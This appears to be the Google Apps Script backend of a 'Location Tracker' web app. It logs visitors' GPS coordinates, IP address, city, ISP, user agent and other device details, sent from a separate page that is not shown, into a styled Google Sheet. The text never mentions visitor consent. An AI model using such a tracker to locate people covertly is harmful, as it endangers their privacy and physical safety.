// ============================================================
// Google Apps Script — Paste this in Google Apps Script Editor
// ============================================================
// Sheet Name: Singularity02
//
// SETUP:
// 1. Open your Google Sheet "Singularity02"
// 2. Go to Extensions > Apps Script
// 3. Delete all existing code and paste this entire script
// 4. Click Deploy > New deployment > Web app
// 5. Execute as: Me | Who has access: Anyone
// 6. Deploy and copy the Web App URL
// 7. Paste URL in index.html where it says YOUR_GOOGLE_APPS_SCRIPT_URL_HERE
// ============================================================

// ⚠️ CHANGE THIS if your sheet tab name is different
var SHEET_NAME = "Sheet1";

function doPost(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName(SHEET_NAME);

    // If the sheet tab doesn't exist, fall back to first sheet
    if (!sheet) {
      sheet = ss.getSheets()[0];
    }

    var expectedHeaders = [
      "S No.",
      "Timestamp",
      "Type",
      "Latitude",
      "Longitude",
      "Accuracy",
      "Google Maps Link",
      "IP Address",
      "City",
      "Region",
      "Country",
      "ISP",
      "User Agent",
      "Platform",
      "Language",
      "Screen Resolution",
      "Referrer"
    ];

    // Add or fix headers
    var needsHeaders = false;
    if (sheet.getLastRow() === 0) {
      needsHeaders = true;
    } else {
      // Check if current headers match expected
      var currentHeader = sheet.getRange(1, 1).getValue();
      var col3 = sheet.getRange(1, 3).getValue();
      if (col3 !== "Type") {
        needsHeaders = true;
        // Clear old headers row and rewrite
        sheet.getRange(1, 1, 1, sheet.getLastColumn()).clearContent();
      }
    }

    if (needsHeaders) {
      sheet.getRange(1, 1, 1, expectedHeaders.length).setValues([expectedHeaders]);
      var headerRange = sheet.getRange(1, 1, 1, expectedHeaders.length);
      headerRange.setFontWeight("bold");
      headerRange.setBackground("#0a0a0f");
      headerRange.setFontColor("#00fff5");
      headerRange.setFontFamily("Consolas");
      headerRange.setHorizontalAlignment("center");
      headerRange.setBorder(true, true, true, true, false, false, "#00fff5", SpreadsheetApp.BorderStyle.SOLID);
      sheet.setFrozenRows(1);
      sheet.setColumnWidth(1, 50);   // S No.
      sheet.setColumnWidth(2, 160);  // Timestamp
      sheet.setColumnWidth(3, 55);   // Type
      sheet.setColumnWidth(4, 110);  // Latitude
      sheet.setColumnWidth(5, 110);  // Longitude
      sheet.setColumnWidth(6, 140);  // Accuracy
      sheet.setColumnWidth(7, 320);  // Maps Link
      sheet.setColumnWidth(8, 120);  // IP
      sheet.setColumnWidth(9, 120);  // City
      sheet.setColumnWidth(10, 120); // Region
      sheet.setColumnWidth(11, 100); // Country
      sheet.setColumnWidth(12, 200); // ISP
      sheet.setColumnWidth(13, 400); // User Agent
      sheet.setColumnWidth(14, 100); // Platform
      sheet.setColumnWidth(15, 80);  // Language
      sheet.setColumnWidth(16, 120); // Screen Res
      sheet.setColumnWidth(17, 100); // Referrer
    }

    var data = JSON.parse(e.postData.contents);

    // Auto-increment S No.
    var lastRow = sheet.getLastRow();
    var serialNo = lastRow; // Row 1 = header, so row 2 = S No. 1

    // Append the data row
    var newRow = lastRow + 1;
    sheet.appendRow([
      serialNo,
      data.timestamp || new Date().toLocaleString(),
      data.locationType || "Unknown",
      data.latitude || "N/A",
      data.longitude || "N/A",
      data.accuracy || "N/A",
      data.googleMapsLink || "N/A",
      data.ip || "N/A",
      data.city || "N/A",
      data.region || "N/A",
      data.country || "N/A",
      data.isp || "N/A",
      data.userAgent || "N/A",
      data.platform || "N/A",
      data.language || "N/A",
      data.screenResolution || "N/A",
      data.referrer || "N/A"
    ]);

    // Style the new data row
    var dataRange = sheet.getRange(newRow, 1, 1, 17);
    dataRange.setFontFamily("Consolas");
    dataRange.setFontSize(9);
    dataRange.setVerticalAlignment("middle");

    // Color code the Type column
    var typeCell = sheet.getRange(newRow, 3);
    if (data.locationType === "GPS") {
      typeCell.setBackground("#0d3320");
      typeCell.setFontColor("#39ff14");
    } else if (data.locationType === "IP") {
      typeCell.setBackground("#1a1a3e");
      typeCell.setFontColor("#00fff5");
    }

    // Style S No. column
    sheet.getRange(newRow, 1).setHorizontalAlignment("center");

    // Alternate row shading
    if (newRow % 2 === 0) {
      dataRange.setBackground("#0d0d12");
    } else {
      dataRange.setBackground("#111118");
    }

    return ContentService
      .createTextOutput(JSON.stringify({ status: "success", message: "Data logged" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Handle GET requests (for testing — visit the URL in browser to check)
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({
      status: "active",
      message: "Location Tracker is running! Send POST requests to log data."
    }))
    .setMimeType(ContentService.MimeType.JSON);
}
